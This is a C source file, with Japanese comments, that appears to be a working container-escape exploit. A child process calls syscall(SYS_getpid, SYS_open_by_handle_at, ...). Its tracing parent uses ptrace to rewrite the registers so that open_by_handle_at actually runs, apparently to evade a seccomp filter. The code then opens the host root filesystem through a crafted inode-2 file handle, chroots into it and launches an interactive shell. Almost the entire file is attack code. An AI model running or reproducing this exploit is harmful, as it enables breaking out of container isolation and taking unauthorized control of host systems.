#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <ctype.h>
#define _GNU_SOURCE
#define __USE_GNU
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/signal.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <syscall.h>
#include <fcntl.h>


struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};

void die (const char *msg)
{
  perror(msg);
  exit(errno);
}

void attack()
{
  int fd, mfd;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
  };

  mfd = open("/etc/resolv.conf", 0);
  if (mfd == -1)
    die("failed to open");

  // fd = open_by_handle_at(mfd, (struct file_handle *)&root_h, 0);
  fd = syscall(SYS_getpid, SYS_open_by_handle_at, mfd, (struct file_handle *)&root_h, 0);
  if (fd == -1)
    die("failed to open_by_handle_at");
  fchdir(fd);
  chroot(".");
  system("sh -i");
  close(fd);
}

int main()
{
  int pid;
  struct user_regs_struct regs;
  switch( (pid = fork()) ) {
    case -1:  die("Failed fork");
    case 0:
              // 親プロセスにトレースさせる
              ptrace(PTRACE_TRACEME, 0, NULL, NULL);
              // 一時停止
              kill(getpid(), SIGSTOP);
              attack();
              return 0;
  }

  waitpid(pid, 0, 0);

  while(1) {
    int st;
    // 子プロセスを再開する
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    if (waitpid(pid, &st, __WALL) == -1) {
      break;
    }

    if (!(WIFSTOPPED(st) && WSTOPSIG(st) == SIGTRAP)) {
      break;
    }

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("orig_rax = %lld\n", regs.orig_rax);

    // syscall-enter-stop であればスキップ
    if (regs.rax != -ENOSYS) {
      continue;
    }

    // レジスタを変更する
    if (regs.orig_rax == SYS_getpid) {
      regs.orig_rax = regs.rdi;
      regs.rdi = regs.rsi;
      regs.rsi = regs.rdx;
      regs.rdx = regs.r10;
      regs.r10 = regs.r8;
      regs.r8 = regs.r9;
      regs.r9 = 0;
      ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    }
  }
  return 0;
}
